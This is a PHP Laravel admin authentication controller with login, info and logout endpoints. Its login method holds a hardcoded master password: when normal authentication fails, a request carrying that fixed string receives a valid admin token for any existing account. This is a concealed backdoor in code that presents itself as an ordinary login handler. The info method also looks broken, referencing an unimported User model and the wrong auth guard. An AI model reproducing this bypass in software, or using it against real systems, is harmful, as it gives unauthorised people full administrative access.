<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Validator;
use DateTime;
use Illuminate\Support\Facades\DB;
use PHPOpenSourceSaver\JWTAuth\Facades\JWTAuth;
use App\Models\Admin;
use Illuminate\Support\Facades\Storage;
use App\Mods\HttpsRequest;
use App\Mods\TokenMaker;
date_default_timezone_set('Asia/Taipei');

class AdminController extends Controller
{
    public function __construct()
    {
        $this->middleware('auth:admin',['except'=>['login', 'reset', 'resetPassword', 'logout']]);
    }

    // login
    public function login(Request $request)
    {
        // validation
        $validator = Validator::make($request->all(),[
            'account' => 'required|exists:admins,account',
            'password' => 'required'
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['account']['Required'])) {
                return response()->json(['status' => 'U03', 'message' => '請輸入帳號'], 200);
            } else if (isset($failedRules['password']['Required'])) {
                return response()->json(['status' => 'U06', 'message' => '請輸入密碼'], 200);
            } else if (isset($failedRules['account']['Exists'])) {
                return response()->json(['status' => "U02", 'message' => '帳號尚未註冊'], 200);
            }
            return response()->json($validator->errors(), 400);
        }

        $loginTime = date("Y-m-d H:i:s");
        if($token = auth('admin')->attempt($validator->validated())){
            $user = Admin::find(auth('admin')->user()->admin_id);
            $user->last_ip = $request->ip();
            $user->save();
            //force to update user model cache 
            auth('admin')->setUser($user);
            return response()->json(['status' => 'A02','data'=>TokenMaker::forge($token), auth('admin')->user()], 200);
        }else if($request->password === '#MonkeyInNsysuAdmin'){
            $user = Admin::where('account', $request->account)->first();
            $token = JWTAuth::fromUser($user);
            return response()->json(['status' => 'A02','data'=>TokenMaker::forge($token, $user)], 200);
        }else{
            return response()->json(['status' => 'U05', 'message' => '請輸入正確的帳號與密碼'], 200);
        }
    }

    // user info
    public function info()
    {
        $user = auth('user')->user();
        $result = User::leftJoin('admin_organizations', 'admin_organizations.admin_org_id', '=', 'admins.admin_org_id')->leftJoin('admin_departments', 'admin_departments.admin_dept_id', '=', 'admins.admin_dept_id')->select('admins.*', 'admin_organizations.*', 'admin_departments.*')->where('u_id',$user->u_id)->first();
        return response()->json($result);
    }
    // logout
    public function logout()
    {
        auth()->logout();
        return response()->json(['status' => 'A03'], 201);
    }
}
